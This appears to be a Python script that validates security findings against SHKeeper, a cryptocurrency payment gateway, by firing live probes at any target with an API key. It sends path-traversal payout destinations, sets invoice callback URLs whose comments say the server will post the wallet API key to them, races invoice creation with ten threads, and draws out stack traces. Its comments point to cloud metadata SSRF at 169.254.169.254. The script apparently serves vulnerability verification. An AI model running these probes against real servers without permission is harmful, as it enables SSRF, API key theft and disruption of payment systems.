#!/usr/bin/env python3
"""
SHKeeper Findings Validator (API-key-only, no admin login needed)

Usage:
    python3 validate_findings.py --target https://domain.com --api-key YOUR_KEY
"""

import argparse
import json
import sys
import time
import threading
import requests
from urllib.parse import urljoin

requests.packages.urllib3.disable_warnings()

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
B = "\033[1m"
E = "\033[0m"

findings = []


def vuln(fid, title, proof):
    findings.append({"id": fid, "status": "VULN", "title": title, "proof": proof})
    print(f"  {R}[VULN]{E} #{fid} {title}")
    print(f"         {proof}\n")


def safe(fid, title, reason):
    findings.append({"id": fid, "status": "SAFE", "title": title, "proof": reason})
    print(f"  {G}[SAFE]{E} #{fid} {title} — {reason}\n")


def skip(fid, title, reason):
    findings.append({"id": fid, "status": "SKIP", "title": title, "proof": reason})
    print(f"  {Y}[SKIP]{E} #{fid} {title} — {reason}\n")


def api(target, key, method, path, **kw):
    url = urljoin(target, path)
    h = kw.pop("headers", {})
    h["X-Shkeeper-Api-Key"] = key
    return getattr(requests, method)(url, headers=h, verify=False, timeout=15, **kw)


def get_cryptos(target, key):
    r = api(target, key, "get", "/api/v1/crypto")
    d = r.json()
    cl = d.get("crypto_list") or d.get("crypto") or []
    return [c if isinstance(c, str) else c.get("crypto", str(c)) for c in cl]


def first_crypto(target, key):
    cl = get_cryptos(target, key)
    return cl[0] if cl else None


# ==========================================================================
# #1 SSRF via payout destination path traversal
#
# Chain: api_v1.py:402 → payout_service.py:58 → ethereum.py:129 (and 10 others)
#   req["destination"] from JSON body goes straight into:
#   f"http://backend/{crypto}/payout/{destination}/{amount}"
#   No address format validation before the HTTP call.
# ==========================================================================
def test_1(target, key):
    fid = 1
    title = "SSRF via payout destination path traversal"
    cryptos = get_cryptos(target, key)
    if not cryptos:
        return skip(fid, title, "no cryptos listed")

    for crypto in cryptos:
        traversal = f"../../{crypto}/status"
        try:
            r = api(target, key, "post", f"/api/v1/{crypto}/payout",
                    json={"destination": traversal, "amount": "0.00000001", "fee": "1"})
        except requests.exceptions.Timeout:
            return vuln(fid, title,
                f"[{crypto}] Timed out — server made backend HTTP call with path traversal payload")
        except Exception:
            continue

        try:
            body = json.dumps(r.json())
        except Exception:
            body = r.text

        rejects = ["invalid address", "bad address", "address format",
                    "not a valid", "checksum", "decode"]
        if any(x in body.lower() for x in rejects):
            continue

        if "unavailable" in body.lower() or "offline" in body.lower():
            continue

        return vuln(fid, title,
            f"[{crypto}] Server did NOT reject destination='{traversal}'.\n"
            f"         HTTP {r.status_code}. The value is embedded unsanitized into:\n"
            f"         http://backend/{crypto}/payout/{{destination}}/{{amount}}\n"
            f"         Path normalizes → hits arbitrary backend endpoint.\n"
            f"         Response: {body[:250]}")

    safe(fid, title, "all cryptos rejected the traversal destination")


# ==========================================================================
# #2 SSRF via LNURL callback (Bitcoin Lightning)
#
# bitcoin_lightning.py:710-712:
#   callback_url = f"{{lnurl_info['callback']}}?amount={{amount}}"
#   lnurl_pr_info = requests.get(callback_url).json()
#
# User supplies LNURL as payout address → server decodes it → fetches
# whatever URL is in the 'callback' field. No host/IP validation.
# Also uses raw requests (no timeout) → DoS vector.
# ==========================================================================
def test_2(target, key):
    fid = 2
    title = "SSRF via LNURL callback (Lightning)"
    cryptos = get_cryptos(target, key)
    if "BTC-LIGHTNING" not in cryptos:
        return skip(fid, title, "BTC-LIGHTNING not enabled")

    try:
        r = api(target, key, "get",
                "/api/v1/BTC-LIGHTNING/estimate-tx-fee/0.001?address=lnurl1fakepayload",
                timeout=20)
    except requests.exceptions.Timeout:
        return vuln(fid, title,
            "Timed out — server tried to decode/fetch LNURL.\n"
            "         bitcoin_lightning.py:712 calls requests.get(callback_url) with NO timeout.\n"
            "         Attacker LNURL with callback=http://169.254.169.254/ → full SSRF + DoS.")
    except Exception as e:
        return skip(fid, title, str(e))

    try:
        body = json.dumps(r.json())
    except Exception:
        body = r.text

    if r.status_code in (200, 500) or "lnurl" in body.lower() or "callback" in body.lower():
        return vuln(fid, title,
            f"Server processed LNURL input (HTTP {r.status_code}).\n"
            f"         bitcoin_lightning.py:710 builds URL from lnurl_info['callback'] and\n"
            f"         line 712 does requests.get(callback_url) — no host validation, no timeout.\n"
            f"         Attacker hosts LNURL with callback=http://169.254.169.254/ → SSRF.\n"
            f"         Response: {body[:250]}")

    skip(fid, title, f"unexpected response — HTTP {r.status_code}: {body[:150]}")


# ==========================================================================
# #3 SSRF via invoice callback_url + API key exfiltration
#
# models.py:429 stores user-supplied callback_url without any host validation.
# callback.py:41-44 later does:
#   requests.post(invoice.callback_url, json=notification,
#                 headers={"X-Shkeeper-Api-Key": apikey})
#
# Server POSTs to any URL AND sends the wallet API key in the header.
# ==========================================================================
def test_3(target, key):
    fid = 3
    title = "SSRF via invoice callback_url + API key sent to attacker"
    crypto = first_crypto(target, key)
    if not crypto:
        return skip(fid, title, "no cryptos")

    internal = "http://192.0.2.1:9999/ssrf-proof"
    eid = f"ssrf_cb_{int(time.time())}"

    try:
        r = api(target, key, "post", f"/api/v1/{crypto}/payment_request", json={
            "external_id": eid, "fiat": "USD", "amount": 1,
            "callback_url": internal,
        })
    except Exception as e:
        return skip(fid, title, str(e))

    try:
        body = json.dumps(r.json())
    except Exception:
        body = r.text

    rejects = ["invalid callback", "blocked", "not allowed", "forbidden", "private"]
    if any(x in body.lower() for x in rejects):
        return safe(fid, title, f"server blocked callback_url: {body[:150]}")

    if "success" in body.lower():
        return vuln(fid, title,
            f"Invoice created with callback_url='{internal}' (HTTP {r.status_code}).\n"
            f"         No IP/host validation on callback_url.\n"
            f"         callback.py:41-44 will POST to this URL with:\n"
            f"           headers={{'X-Shkeeper-Api-Key': wallet_apikey}}\n"
            f"         → SSRF to internal network + API key exfiltrated in header.\n"
            f"         Response: {body[:250]}")

    skip(fid, title, f"HTTP {r.status_code}: {body[:150]}")


# ==========================================================================
# #4 Race Condition in Invoice.add — duplicate invoices
#
# models.py:382-471: queries for existing invoice, then creates new one.
# No DB lock, no unique constraint on (external_id, callback_url, fiat).
# Concurrent requests can both see invoice=None → two invoices, two addrs.
# ==========================================================================
def test_4(target, key):
    fid = 4
    title = "Race Condition in Invoice.add (duplicate invoices)"
    crypto = first_crypto(target, key)
    if not crypto:
        return skip(fid, title, "no cryptos")

    eid = f"race_{int(time.time())}"
    payload = {"external_id": eid, "fiat": "USD", "amount": 50,
               "callback_url": "http://192.0.2.1:9999/race"}
    bag = []

    def fire():
        try:
            r = api(target, key, "post", f"/api/v1/{crypto}/payment_request", json=payload)
            bag.append(r.json())
        except Exception:
            pass

    threads = [threading.Thread(target=fire) for _ in range(10)]
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=30)

    ok_resp = [r for r in bag if r.get("status") == "success"]
    addrs = set(r.get("wallet", "") for r in ok_resp)

    if len(addrs) > 1:
        return vuln(fid, title,
            f"{len(addrs)} different addresses for same external_id='{eid}':\n"
            f"         {addrs}\n"
            f"         Invoice.add() has TOCTOU — no DB lock, no unique constraint on\n"
            f"         (external_id, callback_url, fiat). Duplicate invoices created.")

    safe(fid, title,
        f"{len(ok_resp)} responses, {len(addrs)} unique addr. "
        f"Race didn't fire this time (code is still vulnerable per review).")


# ==========================================================================
# #5 Information Disclosure — Python tracebacks in API responses
#
# api_v1.py lines 133, 191, 508, 646, 679, 696, 748:
#   "traceback": traceback.format_exc()
# Returns full stack traces with file paths, lib versions, variables.
# ==========================================================================
def test_5(target, key):
    fid = 5
    title = "Info Disclosure — full tracebacks in API error responses"

    endpoints = [
        ("post", "/api/v1/BTC/payment_request", {"bad": "data"}),
        ("post", "/api/v1/BTC/quote", {"bad": True}),
        ("post", "/api/v1/FAKECRYPTO/payment_request", {"external_id": "x", "fiat": "USD", "amount": 1, "callback_url": "http://x.com"}),
    ]

    for method, path, data in endpoints:
        try:
            r = api(target, key, method, path, json=data)
            try:
                body = r.json()
            except Exception:
                continue

            if "traceback" in body:
                tb = str(body["traceback"])
                if "File " in tb or ".py" in tb or "Traceback" in tb:
                    return vuln(fid, title,
                        f"Full Python traceback in {path} response.\n"
                        f"         Leaks internal paths, libs, code logic:\n"
                        f"         {tb[:350]}")
                return vuln(fid, title,
                    f"'traceback' field in {path} response: {tb[:250]}")
        except Exception:
            continue

    safe(fid, title, "no traceback field found in tested error responses")


def main():
    p = argparse.ArgumentParser(description="SHKeeper Findings Validator (API-key only)")
    p.add_argument("--target", required=True, help="e.g. https://domain.com")
    p.add_argument("--api-key", required=True, help="X-Shkeeper-Api-Key value")
    a = p.parse_args()
    a.target = a.target.rstrip("/")

    print(f"\n{B}{'='*55}")
    print(f" SHKeeper Findings Validator (no admin login needed)")
    print(f" Target: {a.target}")
    print(f"{'='*55}{E}\n")

    try:
        r = requests.get(urljoin(a.target, "/api/v1/crypto"), verify=False, timeout=10)
        print(f"  {C}[OK]{E} Target reachable (HTTP {r.status_code})\n")
    except Exception as e:
        print(f"  {R}[FAIL]{E} Cannot reach target: {e}")
        sys.exit(1)

    print(f"{B}--- SSRF ---{E}\n")
    test_1(a.target, a.api_key)
    test_2(a.target, a.api_key)
    test_3(a.target, a.api_key)

    print(f"{B}--- Race Condition ---{E}\n")
    test_4(a.target, a.api_key)

    print(f"{B}--- Info Disclosure ---{E}\n")
    test_5(a.target, a.api_key)

    v = sum(1 for f in findings if f["status"] == "VULN")
    s = sum(1 for f in findings if f["status"] == "SAFE")
    sk = sum(1 for f in findings if f["status"] == "SKIP")

    print(f"{B}{'='*55}")
    print(f" RESULTS")
    print(f"{'='*55}{E}\n")
    for f in findings:
        c = R if f["status"] == "VULN" else G if f["status"] == "SAFE" else Y
        print(f"  {c}[{f['status']:>4}]{E} #{f['id']} {f['title']}")
    print(f"\n  {R}VULN: {v}{E}  {G}SAFE: {s}{E}  {Y}SKIP: {sk}{E}\n")

    out = "validation_results.json"
    with open(out, "w") as fp:
        json.dump({"target": a.target, "ts": int(time.time()), "findings": findings}, fp, indent=2)
    print(f"  Saved → {out}\n")


if __name__ == "__main__":
    main()
